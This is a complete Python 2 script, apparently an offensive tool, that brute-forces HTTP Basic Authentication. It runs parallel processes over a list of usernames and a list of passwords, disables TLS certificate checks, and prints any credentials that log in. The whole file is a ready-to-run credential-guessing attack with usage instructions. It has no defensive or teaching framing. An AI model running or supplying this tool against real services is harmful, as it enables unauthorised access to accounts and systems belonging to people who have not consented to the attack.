#!/usr/bin/python

import requests
import multiprocessing
import sys
import Queue


def worker(url, cred_queue, success_queue):
    print '[*] Départ de nouveaux thread.'
    while True:
        
        try:
            creds = cred_queue.get(timeout=10)
        except Queue.Empty:
            print '[-] Thread vide, quitter.'
            return

        
        if not success_queue.empty():
            print '[-] OK,quitter'
            return

        auth = requests.auth.HTTPBasicAuth(creds[0], creds[1])
        resp = requests.get(url, auth=auth, verify=False)
        if resp.status_code == 401:
            print '[-] Faille: {0}/{1}'.format(creds[0], creds[1])
        else:
            print '[+] Succes: {0}/{1}'.format(creds[0], creds[1])
            success_queue.put(creds)
            return


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print 'USAGE: brute_http_basic.py url userfile passfile'
        sys.exit()

    cred_queue = multiprocessing.Queue()
    success_queue = multiprocessing.Queue()
    procs = []

    for i in range(multiprocessing.cpu_count()):
        p = multiprocessing.Process(target=worker, args=(sys.argv[1],
                                                         cred_queue,
                                                         success_queue))
        procs.append(p)
        p.start()

    for user in open(sys.argv[2]):
        user = user.rstrip('\r\n')
        if user == '':
            continue
        for pwd in open(sys.argv[3]):
            pwd = pwd.rstrip('\r\n')
            cred_queue.put((user, pwd))

    for p in procs:
        p.join()

    while not success_queue.empty():
        user, pwd = success_queue.get()
        print 'User: {0} Pass: {1}'.format(user, pwd)

